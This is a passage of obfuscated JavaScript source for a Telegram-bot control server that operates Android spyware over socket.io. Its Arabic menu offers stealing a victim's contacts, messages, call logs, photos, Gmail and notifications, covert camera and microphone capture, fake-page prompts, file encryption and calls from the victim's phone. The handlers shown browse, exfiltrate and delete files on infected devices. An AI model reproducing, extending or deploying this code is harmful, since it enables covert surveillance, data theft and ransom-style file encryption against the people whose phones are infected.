                                      'keyboard': [["📒 سحب جهات اتصال 📒", "💬 سحب الرسائل 💬"], ["📞 سجل المكالمات 📞", "📽 التطبيقات 📽"], ["📸 كيمرا خلفيه 📸", "📸 كيمرا أمامية 📸"], ["🎙 تسجيل صوت 🎙", "📋 سجل الحافظه 📋"], ["📺 لقطة شاشة 📺", "😎 اضهار رساله اسفل الشاشة 😎"], ["💬 ارسال رساله 💬", "📳 اهتزاز 📳"], ["▶ تشغيل الصوت ▶", "🛑 ايقاف الصوت 🛑"], ["🦝 اضهار اشعارات الضحية 🦝", "🛑 ايقاف الاشعارات 🛑"], ["📂 عرض جميع الملفات 📂", "🎬 سحب جميع الصور 🎬"], ["💬 ارسال رساله لجميع ارقام الضحيه 💬"], ["‼ اشعار صفحة مزورة ‼", "📧 سحب رسايل جيميل 📧"], ["⚠️ تشفير ملفات ⚠️", "☎️اتصال من هاتف الضحيه☎️"], ["✯ العودة إلى القائمة الرئيسية ✯"]],
                                      'resize_keyboard': true,
                                      'one_time_keyboard': true
                                    }
                                  });
                                }
                              });
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
});
bot.on("voice", _0x35f9cf => {
  if (appData.get("currentAction") === "recordVoice") {
    let _0x2fe8a7 = _0x35f9cf.voice.file_id;
    let _0x4bed83 = appData.get("currentTarget");
    bot.getFileLink(_0x2fe8a7).then(_0x5f4d18 => {
      console.log(_0x5f4d18);
      io.to(_0x4bed83).emit("commend", {
        'request': "playAudio",
        'extras': [{
          'key': "url",
          'value': _0x5f4d18
        }]
      });
      appData["delete"]("currentTarget");
      appData["delete"]("currentAction");
      bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح  سوف تتلاقى الملف قريبآ...\n\n✯ العودة إلى القائمة الرئيسية</b>\n\n", {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [["✯ عدد الاجهزه ✯", "✯ قائمة التحكم ✯"], ["✯ معلومات عن المطور ✯"]],
          'resize_keyboard': true
        }
      });
    });
  }
});
bot.on("callback_query", _0x3990bc => {
  console.log(_0x3990bc);
  let _0x1cfa71 = _0x3990bc.data;
  let _0x4bf207 = _0x1cfa71.split('|')[0];
  let _0x4286e1 = _0x1cfa71.split('|')[1];
  let _0x2e1f83 = _0x4286e1.split('-')[0];
  let _0x129c1f = _0x4286e1.split('-')[1];
  if (_0x2e1f83 === "back") {
    io.sockets.sockets.forEach((_0x322441, _0x5bbb31, _0x7c5936) => {
      if (_0x322441.model === _0x4bf207) {
        io.to(_0x5bbb31).emit("file-explorer", {
          'request': "back",
          'extras': []
        });
      }
    });
  }
  if (_0x2e1f83 === 'cd') {
    io.sockets.sockets.forEach((_0x3de87c, _0x59b20d, _0x56e269) => {
      if (_0x3de87c.model === _0x4bf207) {
        io.to(_0x59b20d).emit("file-explorer", {
          'request': 'cd',
          'extras': [{
            'key': "name",
            'value': _0x129c1f
          }]
        });
      }
    });
  }
  if (_0x2e1f83 === "upload") {
    io.sockets.sockets.forEach((_0x5c3d87, _0x2e5d91, _0x1a8008) => {
      if (_0x5c3d87.model === _0x4bf207) {
        io.to(_0x2e5d91).emit("file-explorer", {
          'request': "upload",
          'extras': [{
            'key': "name",
            'value': _0x129c1f
          }]
        });
      }
    });
  }
  if (_0x2e1f83 === "delete") {
    io.sockets.sockets.forEach((_0x28742e, _0x59e6b3, _0x16f3f9) => {
      if (_0x28742e.model === _0x4bf207) {
        io.to(_0x59e6b3).emit("file-explorer", {
          'request': "delete",
          'extras': [{
            'key': "name",
            'value': _0x129c1f
          }]
        });
      }
    });
  }
  if (_0x2e1f83 === "request") {
    bot.editMessageText("✯ حدد اي اجرا تريد : " + _0x129c1f, {
      'chat_id': data.id,
      'message_id': _0x3990bc.message.message_id,
      'reply_markup': {
        'inline_keyboard': [[{
          'text': "✯ تحميل ملف ✯",
          'callback_data': _0x4bf207 + "|upload-" + _0x129c1f
        }, {
          'text': "✯ حذف الملف ✯",
          'callback_data': _0x4bf207 + "|delete-" + _0x129c1f
        }]]
      },
      'parse_mode': "HTML"
    });
  }
});
setInterval(() => {
  io.sockets.sockets.forEach((_0x2d2cc4, _0x2a4d9c, _0x415ba4) => {
    io.to(_0x2a4d9c).emit("ping", {});
  });
}, 5000);
server.listen(process.env.PORT || 3000, () => {
  console.log("listening on port 3000");
});